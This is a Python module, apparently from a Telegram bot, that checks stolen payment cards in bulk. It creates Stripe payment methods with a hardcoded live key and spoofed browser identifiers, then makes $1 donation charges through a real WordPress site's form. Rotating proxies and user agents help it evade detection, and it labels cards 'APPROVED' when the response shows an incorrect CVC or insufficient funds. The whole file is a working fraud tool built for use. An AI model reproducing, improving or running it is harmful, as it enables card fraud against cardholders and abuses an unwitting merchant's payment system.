import requests
import random
import time
import os
import re
import json
import uuid
import string
from urllib.parse import urlparse
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# Developer info
dev = "@mhitzxg"

# Configuration - YOUR ORIGINAL CONFIG
pkk = 'pk_live_51PvhEE07g9MK9dNZrYzbLv9pilyugsIQn0DocUZSpBWIIqUmbYavpiAj1iENvS7txtMT2gBnWVNvKk2FHul4yg1200ooq8sVnV'
fn = '2d74654657' 
aj = 'https://allcoughedup.com/wp-admin/admin-ajax.php'
ref = 'https://allcoughedup.com/registry/'

# Website identifiers - YOUR ORIGINAL
guid = 'beed82b8-9f7d-4585-8162-8fa6d92c010c1b6c9b'
muid = 'c70ee7f6-0caf-4555-b545-a1c2d4ee30eb88e211'
sid = 'a1772a92-62c1-4d2e-b5c3-e4939a09a4737b9bc9'

# User agent - YOUR ORIGINAL
us = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'

def get_rotating_user_agent():
    """Generate different types of user agents"""
    agents = [
        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    ]
    return random.choice(agents)

def parse_proxy(proxy_str):
    """Universal proxy parser supporting all formats"""
    try:
        proxy_str = proxy_str.strip()
        
        if '@' in proxy_str:
            auth_part, server_part = proxy_str.split('@', 1)
            username, password = auth_part.split(':', 1)
            ip, port = server_part.split(':', 1)
        else:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                ip, port, username, password = parts
            elif len(parts) == 2:
                ip, port = parts
                username, password = None, None
            else:
                ip, port = parts[0], parts[1]
                username, password = None, None
        
        if username and password:
            proxy_url = f'http://{username}:{password}@{ip}:{port}'
        else:
            proxy_url = f'http://{ip}:{port}'
        
        return {'http': proxy_url, 'https': proxy_url}
    except:
        return None

def requests_retry_session(
    retries=3,
    backoff_factor=0.3,
    status_forcelist=(500, 502, 504),
    session=None,
):
    """Create a requests session with retry logic"""
    session = session or requests.Session()
    retry = Retry(
        total=retries,
        read=retries,
        connect=retries,
        backoff_factor=backoff_factor,
        status_forcelist=status_forcelist,
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def get_random_proxy():
    """Get a random proxy from proxy.txt file"""
    try:
        with open('proxy.txt', 'r') as f:
            proxies = f.readlines()
            if not proxies:
                return None
            
            proxy_str = random.choice(proxies).strip()
            return parse_proxy(proxy_str)
    except:
        return None

def get_bin_info(bin_number):
    """Get BIN information using multiple APIs"""
    if not bin_number or len(bin_number) < 6:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': ''
        }
    
    bin_code = bin_number[:6]
    apis_to_try = [
        f"https://lookup.binlist.net/{bin_code}",
        f"https://bins.antipublic.cc/bins/{bin_code}",
    ]
    
    headers = {
        'Accept': 'application/json',
        'User-Agent': get_rotating_user_agent()
    }
    
    for api_url in apis_to_try:
        try:
            response = requests.get(api_url, headers=headers, timeout=10, verify=False)
            if response.status_code == 200:
                data = response.json()
                bin_info = {}
                
                if 'binlist.net' in api_url:
                    bin_info = {
                        'bank': data.get('bank', {}).get('name', 'Unavailable'),
                        'country': data.get('country', {}).get('name', 'Unknown'),
                        'brand': data.get('scheme', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('brand', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
                    }
                elif 'antipublic.cc' in api_url:
                    bin_info = {
                        'bank': data.get('bank', 'Unavailable'),
                        'country': data.get('country', 'Unknown'),
                        'brand': data.get('vendor', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('level', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country_code', ''))
                    }
                
                for key in ['bank', 'country', 'brand', 'type', 'level']:
                    if not bin_info.get(key) or bin_info[key] in ['', 'N/A', 'None', 'null']:
                        bin_info[key] = 'Unknown'
                
                if bin_info['bank'] not in ['Unavailable', 'Unknown'] or bin_info['brand'] != 'Unknown':
                    return bin_info
                    
        except:
            continue
    
    return {
        'bank': 'Unavailable',
        'country': 'Unknown',
        'brand': 'Unknown',
        'type': 'Unknown',
        'level': 'Unknown',
        'emoji': ''
    }

def get_country_emoji(country_code):
    """Convert country code to emoji"""
    if not country_code or len(country_code) != 2:
        return ''
    try:
        country_code = country_code.upper()
        return ''.join(chr(127397 + ord(char)) for char in country_code)
    except:
        return ''

def extract_error_from_response(response_text):
    """Extract error message from response text - FIXED FOR EMPTY RESPONSES"""
    try:
        # If response is empty or just whitespace
        if not response_text or response_text.strip() == '':
            return "Empty response from server"
        
        # Try to parse as JSON first
        try:
            data = json.loads(response_text)
            
            # Check for common success/error patterns
            if isinstance(data, dict):
                # Check for success message
                if data.get('success') == True:
                    return "CHARGED 1$"
                
                # Check for error in different formats
                if 'error' in data:
                    error_msg = data['error']
                    if isinstance(error_msg, dict) and 'message' in error_msg:
                        return str(error_msg['message'])
                    elif isinstance(error_msg, str):
                        return error_msg
                    else:
                        return str(error_msg)
                
                if 'data' in data and isinstance(data['data'], dict) and 'error' in data['data']:
                    error_data = data['data']['error']
                    if isinstance(error_data, dict) and 'message' in error_data:
                        return str(error_data['message'])
                
                if 'message' in data:
                    return str(data['message'])
                
                # Check for Stripe error format
                if 'error' in data and isinstance(data['error'], dict) and 'message' in data['error']:
                    return str(data['error']['message'])
                
                # If we have data but no clear message, return the JSON
                return json.dumps(data)[:200]
        
        except json.JSONDecodeError:
            # Not JSON, try to extract from text
            
            # Clean the response text
            cleaned_text = response_text.strip()
            
            # Look for common error patterns in text
            error_patterns = [
                (r'decline[^"]*"([^"]+)"', 'Declined'),
                (r'error[^"]*"([^"]+)"', 'Error'),
                (r'invalid[^"]*"([^"]+)"', 'Invalid'),
                (r'incorrect[^"]*"([^"]+)"', 'Incorrect'),
                (r'failed[^"]*"([^"]+)"', 'Failed'),
                (r'cannot[^"]*"([^"]+)"', 'Cannot process'),
                (r'unable[^"]*"([^"]+)"', 'Unable to process'),
                (r'card was declined', 'Card was declined'),
                (r'insufficient funds', 'Insufficient funds'),
                (r'security code.*incorrect', 'Security code incorrect'),
                (r'cvc.*incorrect', 'CVC incorrect'),
                (r'expired', 'Card expired'),
                (r'invalid number', 'Invalid card number'),
            ]
            
            for pattern, default_msg in error_patterns:
                match = re.search(pattern, cleaned_text, re.IGNORECASE)
                if match:
                    if len(match.groups()) > 0 and match.group(1):
                        return match.group(1)
                    else:
                        return default_msg
            
            # Look for HTML error messages
            if '<' in cleaned_text and '>' in cleaned_text:
                # Try to extract text from HTML
                text_only = re.sub(r'<[^>]+>', ' ', cleaned_text)
                text_only = ' '.join(text_only.split())
                if text_only and len(text_only) > 10:
                    return text_only[:150]
            
            # If text is short, return it
            if len(cleaned_text) < 200:
                return cleaned_text if cleaned_text else "Empty response"
            
            # Otherwise return first 150 chars
            return cleaned_text[:150] + "..."
        
        except Exception as e:
            return f"Error parsing response: {str(e)}"
    
    except Exception as e:
        return f"Failed to extract error: {str(e)}"

def get_final_message(response_text, response_obj=None):
    """Extract final user-friendly message from response - FIXED"""
    try:
        # If we have a response object, get its text
        if response_obj and hasattr(response_obj, 'text'):
            response_text = response_obj.text
        
        # If response_text is None or empty
        if not response_text:
            return "No response from server"
        
        # Extract the actual message
        message = extract_error_from_response(response_text)
        
        # Clean up the message
        message = message.strip()
        if message.startswith(','):
            message = message[1:].strip()
        
        # If message is still empty or just punctuation
        if not message or message in [',', '.', ';', ':']:
            return "No message in response"
        
        return message
    
    except Exception as e:
        return f"Error getting message: {str(e)}"

def test_charge(cc_line):
    start_time = time.time()
    
    try:
        time.sleep(random.uniform(0.5, 1.5))
        
        parts = cc_line.strip().split('|')
        if len(parts) < 4:
            ccn, mm, yy, cvc = "0000000000000000", "01", "2025", "123"
        else:
            ccn, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        
        # Get BIN information FIRST (before any other operations)
        bin_info = get_bin_info(ccn[:6])
        
        # YOUR ORIGINAL STRIPE API LOGIC
        headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': us
        }

        # Generate random values for Stripe request
        time_on_page = random.randint(100000, 200000)
        client_session_id = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
        
        # Convert year if needed
        if len(str(yy)) == 2:
            yy_full = 2000 + int(yy)
        else:
            yy_full = int(yy)
        
        # Stripe API data - YOUR ORIGINAL DATA
        data_stripe = (
            f'type=card&card[number]={ccn}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy_full}&'
            f'guid={guid}&muid={muid}&sid={sid}&pasted_fields=number&'
            f'payment_user_agent=stripe.js%2F1f014c0569%3B+stripe-js-v3%2F1f014c0569%3B+card-element&'
            f'referrer={ref}&time_on_page={time_on_page}&'
            f'client_attribution_metadata[client_session_id]={client_session_id}&'
            f'client_attribution_metadata[merchant_integration_source]=elements&'
            f'client_attribution_metadata[merchant_integration_subtype]=card-element&'
            f'client_attribution_metadata[merchant_integration_version]=2017&'
            f'key={pkk}'
        )

        # Get proxy
        proxy_dict = get_random_proxy()
        
        # Make Stripe API request with retry logic
        max_retries = 3
        for retry_count in range(max_retries):
            try:
                # Create session with retry logic
                session = requests_retry_session(retries=2, backoff_factor=0.5)
                
                if proxy_dict:
                    response_stripe = session.post('https://api.stripe.com/v1/payment_methods', 
                                                  headers=headers_stripe, 
                                                  data=data_stripe,
                                                  proxies=proxy_dict,
                                                  timeout=30,
                                                  verify=False)
                else:
                    response_stripe = session.post('https://api.stripe.com/v1/payment_methods', 
                                                  headers=headers_stripe, 
                                                  data=data_stripe,
                                                  timeout=30,
                                                  verify=False)
                break  # Success, break out of retry loop
                
            except (requests.exceptions.SSLError, 
                    requests.exceptions.ConnectionError,
                    requests.exceptions.Timeout,
                    requests.exceptions.RequestException) as e:
                
                if retry_count < max_retries - 1:
                    time.sleep(2 ** retry_count)  # Exponential backoff
                    continue
                else:
                    # All retries failed
                    elapsed_time = time.time() - start_time
                    error_msg = str(e)
                    
                    # Handle specific SSL error
                    if "SSL: UNEXPECTED_EOF_WHILE_READING" in error_msg or "SSLEOFError" in error_msg:
                        error_msg = "SSL Connection Error - Proxy/Network Issue"
                    
                    return f"""
❌ CONNECTION ERROR

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        
        elapsed_time = time.time() - start_time
        
        # Get Stripe response text
        stripe_response_text = response_stripe.text if hasattr(response_stripe, 'text') else ""
        stripe_status = response_stripe.status_code
        
        if stripe_status != 200:
            error_msg = get_final_message(stripe_response_text, response_stripe)
            
            # Check for APPROVED responses (CVC incorrect or insufficient funds)
            if "Your card's security code is incorrect." in error_msg or "security code is incorrect" in error_msg.lower():
                return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            if "Your card has insufficient funds." in error_msg or "insufficient funds" in error_msg.lower():
                return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            return f"""
❌ DECLINED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        
        # Try to parse Stripe JSON response
        try:
            stripe_json = response_stripe.json()
            
            if 'error' in stripe_json:
                error_msg = stripe_json['error'].get('message', 'Unknown Stripe Error')
                
                # Check for APPROVED responses
                if "Your card's security code is incorrect." in error_msg or "security code is incorrect" in error_msg.lower():
                    return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
                if "Your card has insufficient funds." in error_msg or "insufficient funds" in error_msg.lower():
                    return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
                return f"""
❌ DECLINED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            payment_method_id = stripe_json.get("id", "")
            
        except json.JSONDecodeError:
            # If Stripe response is not valid JSON
            error_msg = get_final_message(stripe_response_text)
            return f"""
❌ STRIPE ERROR

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        
        if not payment_method_id:
            error_msg = "Failed to get payment method ID from Stripe"
            return f"""
❌ STRIPE ERROR

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        
        # AJAX request cookies and headers
        cookies_ajax = {
            '__stripe_mid': muid,
            '__stripe_sid': sid,
        }

        headers_ajax = {
            'authority': 'allcoughedup.com',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://allcoughedup.com',
            'referer': ref,
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': us,
            'x-requested-with': 'XMLHttpRequest',
        }

        params_ajax = {
            't': int(time.time() * 1000),
        }

        data_ajax = {
            'data': (
                f'__fluent_form_embded_post_id=3612&_fluentform_4_fluentformnonce={fn}&'
                f'_wp_http_referer=%2Fregistry%2F&names%5Bfirst_name%5D=diwas%20Khatri&'
                f'email=mhitzxg%40mechanicspedia.com&custom-payment-amount=1&'
                f'description=Thanks%20%3A-%20%40zx&payment_method=stripe&'
                f'__stripe_payment_method_id={payment_method_id}'
            ),
            'action': 'fluentform_submit',
            'form_id': '4',
        }

        time.sleep(random.uniform(1, 2))
        
        # Make final AJAX request with retry logic
        for retry_count in range(max_retries):
            try:
                # Create session with retry logic for AJAX request
                ajax_session = requests_retry_session(retries=2, backoff_factor=0.5)
                
                if proxy_dict:
                    response_ajax = ajax_session.post(
                        aj,
                        params=params_ajax,
                        cookies=cookies_ajax,
                        headers=headers_ajax,
                        data=data_ajax,
                        proxies=proxy_dict,
                        timeout=30,
                        verify=False
                    )
                else:
                    response_ajax = ajax_session.post(
                        aj,
                        params=params_ajax,
                        cookies=cookies_ajax,
                        headers=headers_ajax,
                        data=data_ajax,
                        timeout=30,
                        verify=False
                    )
                break  # Success, break out of retry loop
                
            except (requests.exceptions.SSLError, 
                    requests.exceptions.ConnectionError,
                    requests.exceptions.Timeout,
                    requests.exceptions.RequestException) as e:
                
                if retry_count < max_retries - 1:
                    time.sleep(2 ** retry_count)  # Exponential backoff
                    continue
                else:
                    # All retries failed
                    error_msg = str(e)
                    if "SSL: UNEXPECTED_EOF_WHILE_READING" in error_msg or "SSLEOFError" in error_msg:
                        error_msg = "SSL Connection Error - Proxy/Network Issue"
                    
                    return f"""
❌ AJAX CONNECTION ERROR

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        
        # Get AJAX response
        ajax_response_text = response_ajax.text if hasattr(response_ajax, 'text') else ""
        ajax_status = response_ajax.status_code
        
        # Get final message
        final_message = get_final_message(ajax_response_text, response_ajax)
        elapsed_time = time.time() - start_time
        
        # Clean up the final message
        final_message = final_message.strip()
        if final_message.startswith(','):
            final_message = final_message[1:].strip()
        
        # Check for success (CHARGED 1$ should only show when actually charged)
        ajax_response_lower = ajax_response_text.lower()
        
        # Debug: Print raw response for troubleshooting
        print(f"DEBUG - Raw AJAX response: {ajax_response_text[:200]}...")
        
        # Only show "CHARGED 1$" when we have actual success
        is_success = False
        success_indicators = [
            '"success":true',
            'payment successful',
            'thank you for your payment',
            'transaction successful',
            'payment approved',
            'charge successful',
        ]
        
        for indicator in success_indicators:
            if indicator in ajax_response_lower:
                is_success = True
                break
        
        # Also check JSON structure
        try:
            ajax_json = json.loads(ajax_response_text)
            if isinstance(ajax_json, dict) and ajax_json.get('success') == True:
                is_success = True
        except:
            pass
        
        if is_success:
            return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ CHARGED 1$🔥
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        
        # Check for APPROVED responses (CVC incorrect or insufficient funds)
        if "Your card's security code is incorrect." in final_message or "security code is incorrect" in final_message.lower():
            return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        
        if "Your card has insufficient funds." in final_message or "insufficient funds" in final_message.lower():
            return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        
        # If we get here, it's declined
        return f"""
❌ DECLINED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message if final_message else 'Card declined'}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
    except Exception as e:
        elapsed_time = time.time() - start_time
        return f"""
❌ ERROR

💳𝗖𝗖 ⇾ {cc_line.strip()}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: Unknown - Unknown - Unknown
🏛️𝗕𝗮𝗻𝗸: Unavailable
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: Unknown 🏳️
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

# Single CC check function for /st command
def check_single_cc(cc_line):
    return test_charge(cc_line)

# Mass CC check function for /mst command  
def check_mass_cc(cc_lines):
    """Process multiple CCs - EXACTLY LIKE YOUR OLD FILE"""
    results = []
    for cc_line in cc_lines:
        try:
            result = test_charge(cc_line.strip())
            results.append(result)
            # Add delay between requests
            time.sleep(random.uniform(1, 2))
        except Exception as e:
            results.append(f"❌ Error processing card: {str(e)}")
    
    return results
